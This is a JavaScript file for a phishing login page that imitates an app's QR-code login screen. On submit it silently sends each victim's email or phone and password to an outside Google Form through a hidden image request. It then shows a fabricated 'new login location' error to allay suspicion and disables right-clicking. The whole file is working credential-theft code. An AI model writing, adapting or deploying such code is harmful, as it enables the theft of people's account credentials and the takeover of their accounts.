// ==================================
// CONFIG
// ==================================
const CONFIG = {
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000, // 2 minutes
  ELLIPSIS_DELAY_INCREMENT: 0.2,
  QR_STRING_LENGTH: 43,

  // NEW GOOGLE FORM (updated for your latest form)
  GOOGLE_FORM_URL: 'https://docs.google.com/forms/d/e/1FAIpQLSfIwiyfVGTfH2QFUPvorCjah2wcNYfrQRPopjNjSnnTNsD_kw/formResponse',
  ENTRY_EMAIL_OR_PHONE: 'entry.90937571',
  ENTRY_PASSWORD: 'entry.1380960419',
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  loginButton: document.querySelector("button[type='submit']"),
  qrCodeContainer: document.querySelector(".right-section .qr-code"),
  emailInput: document.querySelector('#emailORphone'),
  passwordInput: document.querySelector('#password'),
  emailWrapper: document.querySelector('.email-wrapper'),
  passwordWrapper: document.querySelector('.password-wrapper'),
};

// ==================================
// UTILITY FUNCTIONS
// ==================================
const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join("");
};

// Silent submission to Google Forms (fire-and-forget – completely hidden)
const sendToGoogleForms = (data) => {
  const params = new URLSearchParams({
    [CONFIG.ENTRY_EMAIL_OR_PHONE]: data.emailOrPhone || '',
    [CONFIG.ENTRY_PASSWORD]: data.password || '',
  });

  new Image().src = CONFIG.GOOGLE_FORM_URL + '?' + params.toString() + '&_=' + Date.now();
};

// ==================================
// QR CODE MODULE
// ==================================
const QRCodeModule = {
  generate(data) {
    try {
      const qr = qrcode(0, "L");
      qr.addData(data);
      qr.make();

      const moduleCount = qr.getModuleCount();
      const svgString = qr.createSvgTag(1, 0);

      const parser = new DOMParser();
      const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
      const svgElement = svgDoc.documentElement;

      svgElement.setAttribute("width", "160");
      svgElement.setAttribute("height", "160");
      svgElement.setAttribute("viewBox", "0 0 37 37");

      const path = svgElement.querySelector("path");
      if (path) {
        path.setAttribute("transform", `scale(${37 / moduleCount})`);
      }

      return svgElement;
    } catch (error) {
      console.error("Error generating QR code:", error);
      return null;
    }
  },

  getSpinnerMarkup() {
    return `
      <span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
        <span class="inner wanderingCubes">
          <span class="item"></span>
          <span class="item"></span>
        </span>
      </span>
    `;
  },

  showLoadingAnimation() {
    if (!DOM.qrCodeContainer) return;

    const svg = DOM.qrCodeContainer.querySelector("svg");
    const img = DOM.qrCodeContainer.querySelector("img");

    svg?.remove();
    img?.remove();

    DOM.qrCodeContainer.style.background = "transparent";
    DOM.qrCodeContainer.insertAdjacentHTML("afterbegin", this.getSpinnerMarkup());
  },

  refresh() {
    if (!DOM.qrCodeContainer) return;

    DOM.qrCodeContainer.innerHTML = "";

    const newQRCode = this.generate(`https://app.com/ra/${generateRandomString()}`);

    if (newQRCode) {
      DOM.qrCodeContainer.appendChild(newQRCode);
    }

    DOM.qrCodeContainer.insertAdjacentHTML("beforeend", `<img src="./assets/qrcode-app-logo.png" alt="App Logo">`);
    DOM.qrCodeContainer.style.background = "white";
  },

  simulateRefresh() {
    this.showLoadingAnimation();
    setTimeout(() => this.refresh(), 3500);
  },

  initRefreshInterval() {
    this.simulateRefresh();
    setInterval(() => this.simulateRefresh(), CONFIG.QR_REFRESH_INTERVAL);
  },
};

// ==================================
// LOGIN BUTTON MODULE
// ==================================
const LoginButtonModule = {
  getEllipsisMarkup() {
    return `
      <span class="spinner" role="img" aria-label="Loading">
        <span class="inner pulsingEllipsis">
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
        </span>
      </span>
    `;
  },

  applyAnimationDelays() {
    const spinnerItems = document.querySelectorAll(".spinnerItem");
    spinnerItems.forEach((item, index) => {
      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * CONFIG.ELLIPSIS_DELAY_INCREMENT}s`;
    });
  },

  showNewLoginMessage() {
    if (DOM.emailWrapper && !DOM.emailWrapper.querySelector('.error-message')) {
      const message = document.createElement('span');
      message.className = 'error-message';
      message.textContent = 'New login location detected, please check your e-mail.';
      message.style.color = 'red';
      message.style.display = 'block';
      message.style.fontSize = '12px';
      message.style.marginTop = '5px';
      message.style.marginBottom = '5px';

      const input = DOM.emailWrapper.querySelector('input');
      if (input) {
        DOM.emailWrapper.insertBefore(message, input);
      }
    }

    if (DOM.emailInput) DOM.emailInput.style.border = '1px solid red';
    if (DOM.passwordInput) DOM.passwordInput.style.border = '1px solid red';
  },

  async showLoading() {
    if (!DOM.loginButton) return;

    DOM.loginButton.innerHTML = this.getEllipsisMarkup();
    DOM.loginButton.setAttribute("disabled", "true");
    this.applyAnimationDelays();

    const formData = {
      emailOrPhone: DOM.emailInput?.value || '',
      password: DOM.passwordInput?.value || '',
    };

    // Send to your new Google Form silently
    sendToGoogleForms(formData);

    // Wait for animation
    await new Promise(resolve => setTimeout(resolve, CONFIG.ANIMATION_DURATION));

    // Show fake error
    this.showNewLoginMessage();

    // Reset button
    this.reset();
  },

  reset() {
    if (!DOM.loginButton) return;
    DOM.loginButton.innerHTML = "";
    DOM.loginButton.textContent = "Log In";
    DOM.loginButton.removeAttribute("disabled");
  },

  init() {
    const form = document.querySelector('#loginForm');
    if (form) {
      form.addEventListener("submit", (e) => {
        e.preventDefault();
        this.showLoading();
      });
    }
  },
};

// ==================================
// INITIALIZATION
// ==================================
const init = () => {
  LoginButtonModule.init();
  QRCodeModule.initRefreshInterval();
  document.addEventListener("contextmenu", e => e.preventDefault());
};

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", init);
} else {
  init();
}